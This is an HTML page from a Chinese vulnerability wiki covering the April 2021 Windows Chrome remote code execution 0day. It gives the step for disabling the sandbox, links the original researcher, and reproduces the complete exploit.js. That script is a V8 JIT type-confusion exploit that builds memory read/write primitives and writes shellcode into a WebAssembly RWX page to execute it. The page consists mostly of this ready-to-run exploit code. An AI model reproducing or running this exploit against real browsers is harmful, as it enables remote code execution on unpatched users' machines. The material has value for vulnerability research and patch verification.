<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/Windows%20Chrome%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Windows Chrome 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Windows Chrome \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../librsvg%20XInclude%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2023-38633/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../librsvg%20XInclude%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2023-38633/" class="btn btn-xs btn-link">
        librsvg XInclude 文件包含漏洞 CVE-2023-38633
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Ueditor%20%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Ueditor%20%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="btn btn-xs btn-link">
        Ueditor 编辑器漏洞总结
      </a>
    </div>
    
  </div>

    

    <h1 id="windows-chrome">Windows Chrome 远程命令执行漏洞<a class="headerlink" href="#windows-chrome" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Windows Chrome 0day  在 2021-4-13 被公开</p>
<p>该漏洞未绕过沙箱，需要关闭沙箱才能成功弹出计算器</p>
<div class="highlight"><pre><span></span><code># 关闭沙箱
右键图标--&gt;属性，然后在目标后面加上 -no-sandbox
点击确认
</code></pre></div>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>Window Chrome 浏览器
</code></pre></div>
<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>Github： <a href="https://github.com/r4j0x00/exploits/tree/master/chrome-0day">https://github.com/r4j0x00/exploits/tree/master/chrome-0day</a></p>
<p>推特: <a href="https://twitter.com/r4j0x00/status/1381643526010597380?s=12">https://twitter.com/r4j0x00/status/1381643526010597380?s=12</a></p>
<p><strong>exp.html</strong></p>
<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="s2">&quot;exploit.js&quot;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
</code></pre></div>
<p><strong>exp.js</strong></p>
<div class="highlight"><pre><span></span><code><span class="cm">/*</span>
<span class="cm">/*</span>
<span class="cm">BSD 2-Clause License</span>
<span class="cm">Copyright (c) 2021, rajvardhan agarwal</span>
<span class="cm">All rights reserved.</span>
<span class="cm">Redistribution and use in source and binary forms, with or without</span>
<span class="cm">modification, are permitted provided that the following conditions are met:</span>
<span class="cm">1. Redistributions of source code must retain the above copyright notice, this</span>
<span class="cm">   list of conditions and the following disclaimer.</span>
<span class="cm">2. Redistributions in binary form must reproduce the above copyright notice,</span>
<span class="cm">   this list of conditions and the following disclaimer in the documentation</span>
<span class="cm">   and/or other materials provided with the distribution.</span>
<span class="cm">THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS &quot;AS IS&quot;</span>
<span class="cm">AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</span>
<span class="cm">IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span>
<span class="cm">DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE</span>
<span class="cm">FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL</span>
<span class="cm">DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span>
<span class="cm">SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER</span>
<span class="cm">CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,</span>
<span class="cm">OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE</span>
<span class="cm">OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span>
<span class="cm">*/</span>

<span class="kd">var</span><span class="w"> </span><span class="nx">wasm_code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">([</span><span class="mf">0</span><span class="p">,</span><span class="mf">97</span><span class="p">,</span><span class="mf">115</span><span class="p">,</span><span class="mf">109</span><span class="p">,</span><span class="mf">1</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">1</span><span class="p">,</span><span class="mf">133</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">1</span><span class="p">,</span><span class="mf">96</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">1</span><span class="p">,</span><span class="mf">127</span><span class="p">,</span><span class="mf">3</span><span class="p">,</span><span class="mf">130</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">1</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">4</span><span class="p">,</span><span class="mf">132</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">1</span><span class="p">,</span><span class="mf">112</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">5</span><span class="p">,</span><span class="mf">131</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">1</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">1</span><span class="p">,</span><span class="mf">6</span><span class="p">,</span><span class="mf">129</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">7</span><span class="p">,</span><span class="mf">145</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">2</span><span class="p">,</span><span class="mf">6</span><span class="p">,</span><span class="mf">109</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">109</span><span class="p">,</span><span class="mf">111</span><span class="p">,</span><span class="mf">114</span><span class="p">,</span><span class="mf">121</span><span class="p">,</span><span class="mf">2</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">4</span><span class="p">,</span><span class="mf">109</span><span class="p">,</span><span class="mf">97</span><span class="p">,</span><span class="mf">105</span><span class="p">,</span><span class="mf">110</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">10</span><span class="p">,</span><span class="mf">138</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">1</span><span class="p">,</span><span class="mf">132</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">128</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">65</span><span class="p">,</span><span class="mf">42</span><span class="p">,</span><span class="mf">11</span><span class="p">])</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">wasm_mod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">wasm_instance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>

<span class="kd">var</span><span class="w"> </span><span class="nx">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mf">8</span><span class="p">);</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">f64_buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">u64_buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">buf2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x150</span><span class="p">);</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">f64_buf</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">val</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mf">0</span><span class="p">])</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="nb">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mf">1</span><span class="p">])</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">32n</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">u64_buf</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Number</span><span class="p">(</span><span class="nx">val</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xffffffffn</span><span class="p">);</span>
<span class="w">    </span><span class="nx">u64_buf</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Number</span><span class="p">(</span><span class="nx">val</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">32n</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">f64_buf</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">_arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint32Array</span><span class="p">([</span><span class="mf">2</span><span class="o">**</span><span class="mf">31</span><span class="p">]);</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">foo</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">    </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">_arr</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>

<span class="w">    </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
<span class="w">    </span><span class="nx">x</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="mf">2147483647</span><span class="p">;</span>
<span class="w">    </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>

<span class="w">    </span><span class="nx">x</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">x</span><span class="o">==-</span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>

<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Array</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
<span class="w">    </span><span class="nx">arr</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">cor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mf">1.1</span><span class="p">,</span><span class="w"> </span><span class="mf">1.2</span><span class="p">,</span><span class="w"> </span><span class="mf">1.3</span><span class="p">];</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">[</span><span class="nx">arr</span><span class="p">,</span><span class="w"> </span><span class="nx">cor</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">for</span><span class="p">(</span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="o">=</span><span class="mf">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mh">0x3000</span><span class="p">;</span><span class="o">++</span><span class="nx">i</span><span class="p">)</span>
<span class="w">    </span><span class="nx">foo</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>

<span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">foo</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">cor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">1</span><span class="p">];</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">6</span><span class="p">;</span>
<span class="nx">arr</span><span class="p">[</span><span class="nx">idx</span><span class="o">+</span><span class="mf">10</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x4242</span><span class="p">;</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">addrof</span><span class="p">(</span><span class="nx">k</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">arr</span><span class="p">[</span><span class="nx">idx</span><span class="o">+</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">k</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">cor</span><span class="p">[</span><span class="mf">0</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xffffffffn</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">fakeobj</span><span class="p">(</span><span class="nx">k</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">cor</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">itof</span><span class="p">(</span><span class="nx">k</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">arr</span><span class="p">[</span><span class="nx">idx</span><span class="o">+</span><span class="mf">1</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">var</span><span class="w"> </span><span class="nx">float_array_map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">cor</span><span class="p">[</span><span class="mf">3</span><span class="p">]);</span>

<span class="kd">var</span><span class="w"> </span><span class="nx">arr2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="nx">itof</span><span class="p">(</span><span class="nx">float_array_map</span><span class="p">),</span><span class="w"> </span><span class="mf">1.2</span><span class="p">,</span><span class="w"> </span><span class="mf">2.3</span><span class="p">,</span><span class="w"> </span><span class="mf">3.4</span><span class="p">];</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">fake</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arr2</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x20n</span><span class="p">);</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">arbread</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">addr</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">2n</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">addr</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1n</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">arr2</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">itof</span><span class="p">((</span><span class="mi">2n</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">32n</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">8n</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mf">0</span><span class="p">]);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">arbwrite</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span><span class="w"> </span><span class="nx">val</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">addr</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">2n</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">addr</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1n</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">arr2</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">itof</span><span class="p">((</span><span class="mi">2n</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">32n</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">8n</span><span class="p">);</span>
<span class="w">    </span><span class="nx">fake</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">itof</span><span class="p">(</span><span class="nb">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">));</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span><span class="w"> </span><span class="nx">shellcode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">dataview</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">DataView</span><span class="p">(</span><span class="nx">buf2</span><span class="p">);</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">buf_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">addrof</span><span class="p">(</span><span class="nx">buf2</span><span class="p">);</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">backing_store_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">buf_addr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x14n</span><span class="p">;</span>
<span class="w">    </span><span class="nx">arbwrite</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="p">);</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mf">4</span><span class="o">*</span><span class="nx">i</span><span class="p">,</span><span class="w"> </span><span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kd">var</span><span class="w"> </span><span class="nx">rwx_page_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">arbread</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x68n</span><span class="p">));</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[+] Address of rwx page: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">rwx_page_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">));</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">shellcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mf">3833809148</span><span class="p">,</span><span class="mf">12642544</span><span class="p">,</span><span class="mf">1363214336</span><span class="p">,</span><span class="mf">1364348993</span><span class="p">,</span><span class="mf">3526445142</span><span class="p">,</span><span class="mf">1384859749</span><span class="p">,</span><span class="mf">1384859744</span><span class="p">,</span><span class="mf">1384859672</span><span class="p">,</span><span class="mf">1921730592</span><span class="p">,</span><span class="mf">3071232080</span><span class="p">,</span><span class="mf">827148874</span><span class="p">,</span><span class="mf">3224455369</span><span class="p">,</span><span class="mf">2086747308</span><span class="p">,</span><span class="mf">1092627458</span><span class="p">,</span><span class="mf">1091422657</span><span class="p">,</span><span class="mf">3991060737</span><span class="p">,</span><span class="mf">1213284690</span><span class="p">,</span><span class="mf">2334151307</span><span class="p">,</span><span class="mf">21511234</span><span class="p">,</span><span class="mf">2290125776</span><span class="p">,</span><span class="mf">1207959552</span><span class="p">,</span><span class="mf">1735704709</span><span class="p">,</span><span class="mf">1355809096</span><span class="p">,</span><span class="mf">1142442123</span><span class="p">,</span><span class="mf">1226850443</span><span class="p">,</span><span class="mf">1457770497</span><span class="p">,</span><span class="mf">1103757128</span><span class="p">,</span><span class="mf">1216885899</span><span class="p">,</span><span class="mf">827184641</span><span class="p">,</span><span class="mf">3224455369</span><span class="p">,</span><span class="mf">3384885676</span><span class="p">,</span><span class="mf">3238084877</span><span class="p">,</span><span class="mf">4051034168</span><span class="p">,</span><span class="mf">608961356</span><span class="p">,</span><span class="mf">3510191368</span><span class="p">,</span><span class="mf">1146673269</span><span class="p">,</span><span class="mf">1227112587</span><span class="p">,</span><span class="mf">1097256961</span><span class="p">,</span><span class="mf">1145572491</span><span class="p">,</span><span class="mf">1226588299</span><span class="p">,</span><span class="mf">2336346113</span><span class="p">,</span><span class="mf">21530628</span><span class="p">,</span><span class="mf">1096303056</span><span class="p">,</span><span class="mf">1515806296</span><span class="p">,</span><span class="mf">1497454657</span><span class="p">,</span><span class="mf">2202556993</span><span class="p">,</span><span class="mf">1379999980</span><span class="p">,</span><span class="mf">1096343807</span><span class="p">,</span><span class="mf">2336774745</span><span class="p">,</span><span class="mf">4283951378</span><span class="p">,</span><span class="mf">1214119935</span><span class="p">,</span><span class="mf">442</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">2374846464</span><span class="p">,</span><span class="mf">257</span><span class="p">,</span><span class="mf">2335291969</span><span class="p">,</span><span class="mf">3590293359</span><span class="p">,</span><span class="mf">2729832635</span><span class="p">,</span><span class="mf">2797224278</span><span class="p">,</span><span class="mf">4288527765</span><span class="p">,</span><span class="mf">3296938197</span><span class="p">,</span><span class="mf">2080783400</span><span class="p">,</span><span class="mf">3774578698</span><span class="p">,</span><span class="mf">1203438965</span><span class="p">,</span><span class="mf">1785688595</span><span class="p">,</span><span class="mf">2302761216</span><span class="p">,</span><span class="mf">1674969050</span><span class="p">,</span><span class="mf">778267745</span><span class="p">,</span><span class="mf">6649957</span><span class="p">];</span>
<span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">,</span><span class="w"> </span><span class="nx">shellcode</span><span class="p">);</span>
<span class="nx">f</span><span class="p">();</span>
</code></pre></div>
<p><img alt="image-20220209123907689" src="../images/202202091239826.png" /></p>
<p>`</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
